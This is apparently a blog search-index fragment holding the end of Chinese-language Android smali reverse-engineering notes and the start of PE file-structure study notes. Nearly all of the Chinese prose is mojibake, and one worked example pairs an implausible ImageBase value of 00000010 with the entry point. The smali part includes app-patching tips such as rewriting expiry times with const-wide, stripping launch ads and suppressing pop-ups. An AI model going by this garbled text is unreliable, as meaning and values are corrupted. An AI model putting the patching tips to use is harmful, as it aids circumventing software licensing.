style="text-align:left">å…¬æœ‰</td></tr><tr><td style="text-align:left">protected</td><td style="text-align:left">åŠå…¬å¼€ï¼Œåªæœ‰åŒä¸€å®¶äººæ‰èƒ½ç”¨</td></tr><tr><td style="text-align:left">private</td><td style="text-align:left">ç§æœ‰ï¼Œåªèƒ½è‡ªå·±ä½¿ç”¨</td></tr><tr><td style="text-align:left">.parameter</td><td style="text-align:left">æ–¹æ³•å‚æ•°</td></tr><tr><td style="text-align:left">.prologue</td><td style="text-align:left">æ–¹æ³•å¼€å§‹</td></tr><tr><td style="text-align:left">.line xxx</td><td style="text-align:left">ä½äºç¬¬xxxè¡Œ</td></tr></tbody></table></div><h3 id="æ•°æ®ç±»å‹å¯¹åº”"><a href="#æ•°æ®ç±»å‹å¯¹åº”" class="headerlink" title="æ•°æ®ç±»å‹å¯¹åº”"></a>æ•°æ®ç±»å‹å¯¹åº”</h3><div class="table-container"><table><thead><tr><th style="text-align:left">smaliç±»å‹</th><th style="text-align:left">javaç±»å‹</th><th style="text-align:left">æ³¨é‡Š</th></tr></thead><tbody><tr><td style="text-align:left">V</td><td style="text-align:left">void</td><td style="text-align:left">æ— è¿”å›å€¼</td></tr><tr><td style="text-align:left">Z</td><td style="text-align:left">boolean</td><td style="text-align:left">å¸ƒå°”å€¼ç±»å‹ï¼Œè¿”å›0æˆ–1</td></tr><tr><td style="text-align:left">B</td><td style="text-align:left">byte</td><td style="text-align:left">å­—èŠ‚ç±»å‹ï¼Œè¿”å›å­—èŠ‚</td></tr><tr><td style="text-align:left">S</td><td style="text-align:left">short</td><td style="text-align:left">çŸ­æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td style="text-align:left">C</td><td style="text-align:left">char</td><td style="text-align:left">å­—ç¬¦ç±»å‹ï¼Œè¿”å›å­—ç¬¦</td></tr><tr><td style="text-align:left">I</td><td style="text-align:left">int</td><td style="text-align:left">æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td style="text-align:left">J</td><td style="text-align:left">long ï¼ˆ64ä½ éœ€è¦2ä¸ªå¯„å­˜å™¨å­˜å‚¨ï¼‰</td><td style="text-align:left">é•¿æ•´æ•°ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td style="text-align:left">F</td><td style="text-align:left">float</td><td style="text-align:left">å•æµ®ç‚¹ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td style="text-align:left">D</td><td style="text-align:left">double ï¼ˆ64ä½ éœ€è¦2ä¸ªå¯„å­˜å™¨å­˜å‚¨ï¼‰</td><td style="text-align:left">åŒæµ®ç‚¹ç±»å‹ï¼Œè¿”å›æ•°å­—</td></tr><tr><td style="text-align:left">string</td><td style="text-align:left">String</td><td style="text-align:left">æ–‡æœ¬ç±»å‹ï¼Œè¿”å›å­—ç¬¦ä¸²</td></tr><tr><td style="text-align:left">Lxxx/xxx/xxx</td><td style="text-align:left">object</td><td style="text-align:left">å¯¹è±¡ç±»å‹ï¼Œè¿”å›å¯¹è±¡</td></tr></tbody></table></div><h3 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h3><div class="table-container"><table><thead><tr><th style="text-align:left">å…³é”®å­—</th><th style="text-align:left">æ³¨é‡Š</th></tr></thead><tbody><tr><td style="text-align:left">const</td><td style="text-align:left">é‡å†™æ•´æ•°å±æ€§ï¼ŒçœŸå‡å±æ€§å†…å®¹ï¼Œåªèƒ½æ˜¯æ•°å­—ç±»å‹</td></tr><tr><td style="text-align:left">const-string</td><td style="text-align:left">é‡å†™å­—ç¬¦ä¸²å†…å®¹</td></tr><tr><td style="text-align:left">const-wide</td><td style="text-align:left">é‡å†™é•¿æ•´æ•°ç±»å‹ï¼Œå¤šç”¨äºä¿®æ”¹åˆ°æœŸæ—¶é—´ã€‚</td></tr><tr><td style="text-align:left">return</td><td style="text-align:left">è¿”å›æŒ‡ä»¤</td></tr><tr><td style="text-align:left">if-eq</td><td style="text-align:left">å…¨ç§°equal(a=b)ï¼Œæ¯”è¾ƒå¯„å­˜å™¨abå†…å®¹ï¼Œç›¸åŒåˆ™è·³</td></tr><tr><td style="text-align:left">if-ne</td><td style="text-align:left">å…¨ç§°not equal(a!=b)ï¼Œabå†…å®¹ä¸ç›¸åŒåˆ™è·³</td></tr><tr><td style="text-align:left">if-eqz</td><td style="text-align:left">å…¨ç§°equal zero(a=0)ï¼Œzå³æ˜¯0çš„æ ‡è®°ï¼Œaç­‰äº0åˆ™è·³</td></tr><tr><td style="text-align:left">if-nez</td><td style="text-align:left">å…¨ç§°not equal zero(a!=0)ï¼Œaä¸ç­‰äº0åˆ™è·³</td></tr><tr><td style="text-align:left">if-ge</td><td style="text-align:left">å…¨ç§°greater equal(a&gt;=b)ï¼Œaå¤§äºæˆ–ç­‰äºåˆ™è·³</td></tr><tr><td style="text-align:left">if-le</td><td style="text-align:left">å…¨ç§°little equal(a&lt;=b)ï¼Œaå°äºæˆ–ç­‰äºåˆ™è·³</td></tr><tr><td style="text-align:left">goto</td><td style="text-align:left">å¼ºåˆ¶è·³åˆ°æŒ‡å®šä½ç½®</td></tr><tr><td style="text-align:left">switch</td><td style="text-align:left">åˆ†æ”¯è·³è½¬ï¼Œä¸€èˆ¬ä¼šæœ‰å¤šä¸ªåˆ†æ”¯çº¿ï¼Œå¹¶æ ¹æ®æŒ‡ä»¤è·³è½¬åˆ°é€‚å½“ä½ç½®</td></tr><tr><td style="text-align:left">iget</td><td style="text-align:left">è·å–å¯„å­˜å™¨æ•°æ®</td></tr></tbody></table></div><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><p>åœ¨smailé‡Œæ‰€æœ‰æ“ä½œé€šè¿‡å¯„å­˜å™¨æ¥è¿›è¡Œ</p><ul><li><strong>æœ¬åœ°å¯„å­˜å™¨</strong>ï¼švå¼€å¤´æ•°å­—ç»“å°¾ v0</li><li><strong>å‚æ•°å¯„å­˜å™¨</strong>ï¼špå¼€å¤´æ•°å­—ç»“å°¾ p0</li></ul><p><strong>Q</strong> ï¼šp0ä¸€å®šæ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å—ï¼Ÿ</p><p><strong>A</strong>ï¼šåœ¨staticå‡½æ•°ä¸­p0å¯¹åº”ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå› ä¸ºjavaè¯­æ³•é‡Œæ²¡æœ‰staticè¯­æ³•ï¼‰</p><p>åœ¨éstaticå‡½æ•°ä¸­ï¼Œp0ä»£æŒ‡ <strong>â€œthisâ€</strong>ï¼Œp1è¡¨ç¤ºå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°</p><h2 id="å®æˆ˜åŸç†"><a href="#å®æˆ˜åŸç†" class="headerlink" title="å®æˆ˜åŸç†"></a>å®æˆ˜åŸç†</h2><h3 id="åŒå¼€åŸç†"><a href="#åŒå¼€åŸç†" class="headerlink" title="åŒå¼€åŸç†"></a>åŒå¼€åŸç†</h3><ul><li><strong>ä¿®æ”¹åŒ…å</strong>ï¼šè®©æ‰‹æœºç³»ç»Ÿè®¤ä¸ºè¿™æ˜¯2ä¸ªAPPå®ç°ï¼Œæ”¹å˜äº†åº”ç”¨çš„ç­¾åä¿¡æ¯ï¼Œå¦‚æœæœ‰ç­¾åæ ¡éªŒåˆ™å¯èƒ½é—ªé€€å´©æºƒ</li><li><strong>ä¿®æ”¹Framework</strong></li><li><strong>é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯å®ç°</strong></li><li><strong>ä»¥æ’ä»¶æœºåˆ¶è¿è¡Œ</strong>ï¼šåˆ©ç”¨åå°„æ›¿æ¢ï¼ŒåŠ¨æ€ä»£{è¿‡}{æ»¤}ç†ï¼Œhookäº†ç³»ç»Ÿçš„å¤§éƒ¨åˆ†ä¸systemâ€”serverè¿›ç¨‹é€šè®¯çš„å‡½æ•°ï¼Œä»¥æ­¤ä½œä¸ºâ€œæ¬ºä¸Šç’ä¸‹â€çš„ç›®çš„ï¼Œæ¬ºéª—ç³»ç»Ÿâ€œä»¥ä¸ºâ€åªæœ‰ä¸€ä¸ªapkåœ¨è¿è¡Œï¼Œç’è¿‡æ’ä»¶è®©å…¶â€œè®¤ä¸ºâ€è‡ªå·±å·²ç»å®‰è£…ã€‚</li></ul><h3 id="å»å¹¿å‘Š"><a href="#å»å¹¿å‘Š" class="headerlink" title="å»å¹¿å‘Š"></a>å»å¹¿å‘Š</h3><p>å¯åŠ¨å¹¿å‘Šæµç¨‹ï¼š</p><ul><li>å¯åŠ¨Activity-&gt;å¹¿å‘ŠActivity-&gt;ä¸»é¡µActivity</li></ul><p>ä¿®æ”¹æ–¹æ³•ï¼š</p><ul><li>ä¿®æ”¹åŠ è½½æ—¶é—´</li><li>Acitivityåˆ‡æ¢å®šä½ï¼Œä¿®æ”¹Intentçš„Activityç±»å</li></ul><h3 id="å¼¹çª—å®šä½-amp-å †æ ˆåˆ†æ"><a href="#å¼¹çª—å®šä½-amp-å †æ ˆåˆ†æ" class="headerlink" title="å¼¹çª—å®šä½&amp;å †æ ˆåˆ†æ"></a>å¼¹çª—å®šä½&amp;å †æ ˆåˆ†æ</h3><p>ä¿®æ”¹æ–¹æ³•ï¼š<br>1.ä¿®æ”¹xmlä¸­çš„versiocode<br>2.Hookå¼¹çª—(æ¨èç®—æ³•åŠ©æ‰‹å¼€å¯å¼¹çª—å®šä½)<br>3.ä¿®æ”¹dexå¼¹çª—ä»£ç <br>4.æŠ“åŒ…ä¿®æ”¹å“åº”ä½“(ä¹Ÿå¯ä»¥è·¯ç”±å™¨æ‹¦æˆª)</p><h3 id="å¸ƒå±€ä¼˜åŒ–"><a href="#å¸ƒå±€ä¼˜åŒ–" class="headerlink" title="å¸ƒå±€ä¼˜åŒ–"></a>å¸ƒå±€ä¼˜åŒ–</h3><p>1.å¼€å‘è€…åŠ©æ‰‹æŠ“å¸ƒå±€<br>2.MTç®¡ç†å™¨xmlæœç´¢å®šä½<br>3.ä¿®æ”¹xmlä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></figure><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PEæ–‡ä»¶ç»“æ„å­¦ä¹ </title>
      <link href="/2025/01/05/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/01/05/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>èµ„æ–™æ¥æºï¼šã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹å’Œ<a href="https://www.youtube.com/watch?v=oSpeXGHaKAk&amp;t=15123s">PEæ–‡ä»¶ç»“æ„æ ¼å¼è¯¦è§£ï¼ˆå®Œæ•´ç‰ˆï¼‰ã€é€†å‘ç¼–ç¨‹ã€‘ (youtube.com)</a></p><h1 id="ä¸€ã€PEæ–‡ä»¶åŸºç¡€"><a href="#ä¸€ã€PEæ–‡ä»¶åŸºç¡€" class="headerlink" title="ä¸€ã€PEæ–‡ä»¶åŸºç¡€"></a>ä¸€ã€PEæ–‡ä»¶åŸºç¡€</h1><h2 id="1-å¯æ‰§è¡Œæ–‡ä»¶"><a href="#1-å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="1.å¯æ‰§è¡Œæ–‡ä»¶"></a>1.å¯æ‰§è¡Œæ–‡ä»¶</h2><p>Windowsï¼šPE</p><p>Linux: elf</p><h2 id="2-PEæ–‡ä»¶ç‰¹å¾"><a href="#2-PEæ–‡ä»¶ç‰¹å¾" class="headerlink" title="2.PEæ–‡ä»¶ç‰¹å¾"></a>2.PEæ–‡ä»¶ç‰¹å¾</h2><p>PEæ–‡ä»¶æŒ‡çº¹</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011858080.png" alt="1735729100495.png"></p><h2 id="3-PEç»“æ„"><a href="#3-PEç»“æ„" class="headerlink" title="3.PEç»“æ„"></a>3.PEç»“æ„</h2><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011859756.png" alt="1735729120355.png"></p><h3 id="DOSå¤´"><a href="#DOSå¤´" class="headerlink" title="DOSå¤´"></a>DOSå¤´</h3><ul><li><strong>DOS MZå¤´</strong>  <strong>IMAGE_DOS_HEADER(64å­—èŠ‚)</strong></li></ul><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011859938.png" alt="1735729155568.png"></p><p><strong>e_magic</strong>ï¼š4D5Aæ˜¯DOSç­¾åï¼Œä¸å¯æ”¹</p><p><strong>e_lfanew</strong>ï¼š78æŒ‡å‘PEå¤´å¼€å§‹ä½ç½®ï¼Œè¦æ”¹è¦ä¸€èµ·æ”¹ã€‚</p><p>ä¸Šé¢ä¸¤ä¸ªæ˜¯<strong>PEæŒ‡çº¹</strong>ï¼Œæ“ä½œç³»ç»Ÿç”¨æ¥<strong>è¯†åˆ«æ˜¯å¦æ˜¯PEæ–‡ä»¶</strong>ï¼Œå…¶ä»–åœ°æ–¹å¯ä»¥éšä¾¿æ”¹ï¼Œå› ä¸º<em>IMAGE_DOS_HEADER</em>æ˜¯ç»™16ä½å¹³å°çœ‹çš„ï¼Œè€Œæˆ‘ä»¬ç°åœ¨çš„ç¯å¢ƒå¤§éƒ¨åˆ†æ˜¯32ä½æˆ–è€…64ä½ã€‚</p><ul><li><strong>MS_DOS Stu</strong>ï¼ŒDOSå­˜æ ¹ï¼Œç”¨æ¥ç»™é“¾æ¥å™¨æ’å…¥æ•°æ®ï¼Œéšä¾¿æ”¹</li></ul><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011900211.png" alt="1735729196266.png"></p><h3 id="NTå¤´-IMAGE-NT-HEADERS"><a href="#NTå¤´-IMAGE-NT-HEADERS" class="headerlink" title="NTå¤´ IMAGE_NT_HEADERS"></a>NTå¤´ IMAGE_NT_HEADERS</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line"> DWORD Signature; ``<span class="comment">// PEæ ‡è¯†</span></span><br><span class="line"> IMAGE_FILE_HEADER FileHeader; ``<span class="comment">// æ ‡å‡†PEå¤´</span></span><br><span class="line"> IMAGE_OPTIONAL_HEADER32 OptionalHeader; ``<span class="comment">// æ‰©å±•PEå¤´</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h4 id="PEæ ‡è¯†-Signature-4å­—èŠ‚"><a href="#PEæ ‡è¯†-Signature-4å­—èŠ‚" class="headerlink" title="PEæ ‡è¯† Signature 4å­—èŠ‚"></a>PEæ ‡è¯† Signature 4å­—èŠ‚</h4><p><strong><u>ä¸å¯æ”¹</u></strong>,æ“ä½œç³»ç»Ÿå¯åŠ¨ç¨‹åºçš„æ—¶å€™è¯†åˆ«è¿™ä¸ªæ ‡è¯†ã€‚</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011901322.png" alt="1735729196266.png"></p><h4 id="æ ‡å‡†PEå¤´-IMAGE-FILE-HEADER-20å­—èŠ‚"><a href="#æ ‡å‡†PEå¤´-IMAGE-FILE-HEADER-20å­—èŠ‚" class="headerlink" title="æ ‡å‡†PEå¤´ IMAGE_FILE_HEADER(20å­—èŠ‚)"></a>æ ‡å‡†PEå¤´ <strong>IMAGE_FILE_HEADER</strong>(20å­—èŠ‚)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line"> WORD Machine; <span class="comment">// å¯ä»¥è¿è¡Œåœ¨ä»€ä¹ˆæ ·çš„CPUä¸Š</span></span><br><span class="line"> WORD NumberOfSections; <span class="comment">// è¡¨ç¤ºèŠ‚çš„æ•°é‡</span></span><br><span class="line"> DWORD TimeDateStamp; <span class="comment">// ç¼–è¯‘å™¨å¡«å†™çš„æ—¶é—´æˆ³</span></span><br><span class="line"> DWORD PointerToSymbolTable; <span class="comment">// è°ƒè¯•ç›¸å…³</span></span><br><span class="line"> DWORD NumberOfSymbols; <span class="comment">// è°ƒè¯•ç›¸å…³</span></span><br><span class="line"> WORD SizeOfOptionalHeader; <span class="comment">// æ‰©å±•PEå¤´çš„å¤§å°</span></span><br><span class="line"> WORD Characteristics; <span class="comment">// æ–‡ä»¶å±æ€§</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011902971.png" alt="1735729302371.png"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011902440.png" alt="1735729314190.png"></p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011902205.png" alt="1735729331600.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">64 86 -&gt;8664 ä»£è¡¨åœ¨x64ä¸Šè¿è¡Œ</span><br><span class="line">0F 00 æœ‰0x0Fä¸ªèŠ‚åŒº</span><br><span class="line">84 D7 68 65 ç¼–è¯‘å™¨å†™çš„æ—¶é—´æˆ³ï¼Œå’Œæ–‡ä»¶æ— å…³ï¼Œéšä¾¿æ”¹</span><br><span class="line">è°ƒè¯•ä¸ç®¡</span><br><span class="line">F0 00 æ‰©å±•PEå¤´å¤§å°ï¼Œå¯æ”¹</span><br><span class="line">22 00-&gt;0022-&gt; 0000 0000 0010 0010 ç¬¬2ä½ï¼Œç¬¬6ä½æœ‰å€¼ å¯¹åº”æ•°æ®ä½1ï¼Œ5 åˆ†åˆ«ä»£è¡¨æ–‡ä»¶å¯æ‰§è¡Œï¼Œåº”ç”¨ç¨‹åºå¯ä»¥å¤„ç†å¤§äº2GBçš„åœ°å€ï¼ˆä»£è¡¨64ä½ï¼‰</span><br></pre></td></tr></table></figure><h4 id="æ‰©å±•PEå¤´-IMAGE-OPTIONAL-HEADER"><a href="#æ‰©å±•PEå¤´-IMAGE-OPTIONAL-HEADER" class="headerlink" title="æ‰©å±•PEå¤´  IMAGE_OPTIONAL_HEADER"></a>æ‰©å±•PEå¤´  IMAGE_OPTIONAL_HEADER</h4><h5 id="æ‰©å±•PEå¤´ç»“æ„-amp-ä¸åŒç¼–è¯‘å™¨ä¸Šçš„å·®å¼‚"><a href="#æ‰©å±•PEå¤´ç»“æ„-amp-ä¸åŒç¼–è¯‘å™¨ä¸Šçš„å·®å¼‚" class="headerlink" title="æ‰©å±•PEå¤´ç»“æ„&amp;ä¸åŒç¼–è¯‘å™¨ä¸Šçš„å·®å¼‚"></a>æ‰©å±•PEå¤´ç»“æ„&amp;ä¸åŒç¼–è¯‘å™¨ä¸Šçš„å·®å¼‚</h5><p>32ä½ä¸Šæ˜¯224å­—èŠ‚ï¼ˆE0)ï¼ˆå¯æ‰©å±•ï¼‰</p><p>64ä½æ˜¯F0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32ä½ä¸ºä¾‹</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER32</span> &#123;</span></span><br><span class="line">    WORD    Magic;                  <span class="comment">// æ ‡å¿—ï¼šPE32 æ˜¯ 0x10B</span></span><br><span class="line">    BYTE    MajorLinkerVersion;     <span class="comment">// é“¾æ¥å™¨çš„ä¸»ç‰ˆæœ¬å·</span></span><br><span class="line">    BYTE    MinorLinkerVersion;     <span class="comment">// é“¾æ¥å™¨çš„æ¬¡ç‰ˆæœ¬å·</span></span><br><span class="line">    DWORD   SizeOfCode;             <span class="comment">// ä»£ç æ®µçš„å¤§å°ï¼ˆæ²¡ç”¨ï¼‰</span></span><br><span class="line">    DWORD   SizeOfInitializedData;  <span class="comment">// åˆå§‹åŒ–æ•°æ®æ®µçš„å¤§å°ï¼ˆæ²¡ç”¨ï¼‰</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;<span class="comment">// æœªåˆå§‹åŒ–æ•°æ®æ®µçš„å¤§å°ï¼ˆæ²¡ç”¨ï¼‰</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;    <span class="comment">// ç¨‹åºå…¥å£ç‚¹çš„ RVA</span></span><br><span class="line">    DWORD   BaseOfCode;             <span class="comment">// ä»£ç æ®µçš„èµ·å§‹ RVAï¼ˆæ²¡ç”¨ï¼‰</span></span><br><span class="line">    DWORD   BaseOfData;             <span class="comment">// æ•°æ®æ®µçš„èµ·å§‹ RVAï¼ˆæ²¡ç”¨ï¼‰</span></span><br><span class="line">    DWORD   ImageBase;              <span class="comment">// å†…å­˜é•œåƒåŸºå€</span></span><br><span class="line">    DWORD   SectionAlignment;       <span class="comment">// å†…å­˜å¯¹é½</span></span><br><span class="line">    DWORD   FileAlignment;          <span class="comment">// æ–‡ä»¶å¯¹é½</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion; <span class="comment">// OS ä¸»ç‰ˆæœ¬å·</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion; <span class="comment">// OS æ¬¡ç‰ˆæœ¬å·</span></span><br><span class="line">    DWORD   SizeOfImage;            <span class="comment">// é•œåƒçš„æ€»å¤§å°</span></span><br><span class="line">    DWORD   SizeOfHeaders;          <span class="comment">// å¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½åçš„æ€»å¤§å°</span></span><br><span class="line">    DWORD   CheckSum;               <span class="comment">// æ ¡éªŒå’Œ</span></span><br><span class="line">    WORD    Subsystem;              <span class="comment">// å­ç³»ç»Ÿï¼ˆå¦‚ GUIã€CUIï¼‰</span></span><br><span class="line">    WORD    DllCharacteristics;    <span class="comment">// DLL å±æ€§</span></span><br><span class="line">    DWORD   SizeOfStackReserve;     <span class="comment">// å †æ ˆä¿ç•™å¤§å°</span></span><br><span class="line">    DWORD   SizeOfStackCommit;      <span class="comment">// å †æ ˆæäº¤å¤§å°</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;      <span class="comment">// å †ä¿ç•™å¤§å°</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;       <span class="comment">// å †æäº¤å¤§å°</span></span><br><span class="line">    DWORD   LoaderFlags;            <span class="comment">// è£…è½½å™¨æ ‡å¿—ï¼ˆé€šå¸¸ä¸º 0ï¼‰</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;    <span class="comment">// æ•°æ®ç›®å½•é¡¹æ•°</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[<span class="number">16</span>]; <span class="comment">// è¡¨ï¼Œç»“æ„ä½“æ•°ç»„</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th><strong>å­—æ®µåç§°</strong></th><th><strong>32 ä½ PEï¼ˆPE32ï¼‰</strong></th><th><strong>64 ä½ PEï¼ˆPE32+ï¼‰</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td><code>Magic</code></td><td><code>0x10B</code></td><td><code>0x20B</code></td><td>æ ‡è¯† PE æ–‡ä»¶æ˜¯ 32 ä½ï¼ˆPE32ï¼‰è¿˜æ˜¯ 64 ä½ï¼ˆPE32+ï¼‰ã€‚</td></tr><tr><td><code>AddressOfEntryPoint</code></td><td>å­˜åœ¨</td><td>å­˜åœ¨</td><td>ç¨‹åºå…¥å£ç‚¹çš„ RVAï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰ã€‚</td></tr><tr><td><code>BaseOfCode</code></td><td>å­˜åœ¨</td><td>å­˜åœ¨</td><td>ä»£ç æ®µçš„èµ·å§‹ RVAã€‚</td></tr><tr><td><code>BaseOfData</code></td><td>å­˜åœ¨</td><td><strong>ä¸å­˜åœ¨</strong></td><td>æ•°æ®æ®µçš„èµ·å§‹ RVAï¼Œ<strong>ä»…åœ¨ PE32 ä¸­å­˜åœ¨</strong>ã€‚</td></tr><tr><td><code>ImageBase</code></td><td>32 ä½åœ°å€ï¼ˆé»˜è®¤ 0x00400000ï¼‰</td><td>64 ä½åœ°å€ï¼ˆé»˜è®¤ 0x0000000140000000ï¼‰</td><td>å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­çš„é¦–åœ°å€ã€‚</td></tr><tr><td><code>SizeOfStackReserve</code></td><td>32 ä½å€¼</td><td>64 ä½å€¼</td><td>ä¸ºçº¿ç¨‹çš„å †æ ˆé¢„ç•™çš„å¤§å°ã€‚</td></tr><tr><td><code>SizeOfHeapReserve</code></td><td>32 ä½å€¼</td><td>64 ä½å€¼</td><td>ä¸ºå †åˆ†é…çš„ä¿ç•™å¤§å°ã€‚</td></tr></tbody></table></div><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011903423.png" alt="1735729389033.png"></p><ul><li><strong>Magic</strong></li></ul><p>2ä¸ªå­—èŠ‚ï¼Œæ–‡ä»¶çš„æ ‡å¿—</p><p>32 ä½ï¼š10B</p><p>64 ä½ï¼š20B </p><ul><li><strong>AddressOfEntryPoint</strong></li></ul><p>4ä¸ªå­—èŠ‚ï¼Œç¨‹åºçš„å…¥å£ç‚¹åœ°å€ï¼Œå³æ‰§è¡Œå¼€å§‹çš„ä½ç½®ã€‚</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011904115.png" alt="1735729398902.png"></p><ul><li><strong>ImageBase</strong></li></ul><p>4ä¸ªå­—èŠ‚ï¼Œç¨‹åºåŠ è½½çš„åŸºåœ°å€ã€‚</p><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501011904366.png" alt="1735729409663.png"></p><p>AddressOfEntryPointï¼š<u>042CE910</u></p><p>imagebase:<u>00000010</u></p><p>ç¨‹åºæ‰§è¡Œå…¥å£ï¼šï¼ˆEIP)042CE910+00000010=042CE920</p><ul><li><strong>SectionAlignment</strong></li></ul><p>èŠ‚åŒºçš„å†…å­˜å¯¹é½å¤§å°ï¼ŒèŠ‚åŒºåœ¨<strong>å†…å­˜</strong>ä¸­çš„æœ€å°å¤§å°ã€‚</p><ul><li><strong>FileAlignment</strong></li></ul><p>èŠ‚åŒºçš„æ–‡ä»¶å¯¹é½å¤§å°ï¼ŒèŠ‚åŒºåœ¨<strong>ç£ç›˜æ–‡ä»¶</strong>ä¸­çš„æœ€å°å•ä½ã€‚</p><ul><li><strong>SizeOfImage</strong></li></ul><p>è¡¨ç¤ºåœ¨å†…å­˜ä¸­<strong>æ•´ä¸ª</strong>PEæ–‡ä»¶æ˜ å°„çš„å¤§å°ï¼ˆåŒ…æ‹¬æ‰€æœ‰èŠ‚åŒºå’Œå¤´ä¿¡æ¯ï¼‰ï¼Œå¯æ¯”å®é™…çš„å€¼å¤§ã€‚å†…å­˜å¯¹é½ä»¥åæ˜¯SectionAlignmentæˆ–è€…FileAlignmentçš„æ•´æ•°å€ã€‚</p><ul><li><strong>SizeOfHeaders</strong></li></ul><p>PE æ–‡ä»¶å¤´çš„å¤§å°ã€‚æ˜¯<strong>FileAlignmentçš„æ•´æ•°å€</strong>ã€‚</p><ul><li><strong>CheckSum</strong></li></ul><p>æ 